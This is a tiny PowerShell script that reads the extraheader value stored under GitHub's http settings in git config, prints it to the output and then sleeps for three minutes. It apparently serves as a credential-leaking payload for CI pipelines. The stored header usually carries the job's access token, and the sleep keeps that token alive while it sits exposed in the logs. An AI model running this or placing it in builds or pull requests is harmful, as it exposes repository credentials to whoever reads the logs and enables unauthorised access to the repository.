# Get the value of the extra header from .git/config
$extraheader = git config --get http.https://github.com/.extraheader

# Print the value
Write-Output "Extra Header: $extraheader"

# Sleep for 3 minutes
Start-Sleep -Seconds 180
